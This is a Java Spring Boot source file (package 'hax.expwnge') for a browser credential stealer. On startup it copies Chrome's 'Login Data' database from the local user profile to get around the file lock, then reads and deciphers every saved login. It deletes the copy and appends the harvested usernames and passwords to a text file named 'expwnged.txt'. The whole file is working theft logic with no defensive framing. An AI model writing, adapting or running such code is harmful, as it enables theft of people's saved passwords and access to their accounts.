package hax.expwnge;

import static hax.expwnge.models.Login.LOGIN_TABLE_FACTORY;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.nio.file.StandardOpenOption;
import java.util.List;

import org.apache.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.ImportResource;
import org.springframework.scheduling.annotation.EnableAsync;
import org.springframework.scheduling.annotation.EnableScheduling;

import hax.expwnge.dao.LoginDAO;
import hax.expwnge.models.Login;

@SpringBootApplication
@EnableAsync
@EnableScheduling
@ImportResource("classpath:applicationContext.xml")
public class Expwnge implements CommandLineRunner {
  @Autowired
  private LoginDAO loginDAO;
  private static final Logger LOGGER = Logger.getLogger(Expwnge.class);

  /**
   * Register SQLite JDBC Driver
   */
  static {
    try {
      Class.forName("org.sqlite.JDBC");
    } catch (ClassNotFoundException e) {
      LOGGER.error(e);
    }
  }

  public static void main(String[] args) {
    SpringApplication.run(Expwnge.class, args);
  }

  @Override
  public void run(String... args) throws Exception {
    String chromeFolder = System.getenv("LOCALAPPDATA")+"/Google/Chrome/User Data/Default/";
    
    /** Copy file to dance around database file lock **/
    Path resultPath = null;
    try {
      resultPath = Files.copy(Paths.get(chromeFolder+"Login Data"), Paths.get(chromeFolder+"MyData Copy"), StandardCopyOption.REPLACE_EXISTING);
    } catch (Exception e) {
      LOGGER.error(e);
    }

    /** Read and decipher all login details **/
    List<Login> logins = loginDAO.getLoginDetails(resultPath);
    
    /** Delete the database copy **/
    try {
      Files.delete(resultPath);
    } catch (Exception e) {
      LOGGER.error(e);
    }

    /** Store formatted data **/
    try {
      Files.write(Paths.get("expwnged.txt"), LOGIN_TABLE_FACTORY.new Table(logins).getContent(), StandardOpenOption.CREATE, StandardOpenOption.APPEND);
    } catch (Exception e) {
      LOGGER.error(e);
    }
  }
}
